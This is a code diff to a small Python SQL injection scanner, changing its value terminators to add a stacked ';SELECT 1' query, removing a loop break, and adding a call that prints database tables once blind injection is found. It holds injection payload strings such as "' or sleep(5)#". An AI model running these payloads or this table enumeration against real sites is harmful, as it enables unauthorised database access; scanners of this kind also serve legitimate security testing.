@@ -7,7 +7,7 @@ import Blinder
 
 class sql:
     payloads = ["' AND 1=2", '#', "' or sleep(5)#"]
-    value_terminators = ["'", ";", "%00"]
+    value_terminators = ["'", ";SELECT 1", "%00"]
 
     def __init__(self, url):
         self.url = url
@@ -25,7 +25,6 @@ class sql:
                 vulnerability = is_vulnerable(content, link)
                 if not vulnerability:
                     is_blind(self.url)
-                    break
 
 
 def is_vulnerable(response, url):
@@ -52,6 +51,7 @@ def is_blind(url):
     blindCheck = Blinder.blinder(url, sleep=2)
     if blindCheck.check_injection():
         print("Blind SQL Injection at {}".format(url))
+        print(blindCheck.get_tables())
 
 
 if __name__ == '__main__':
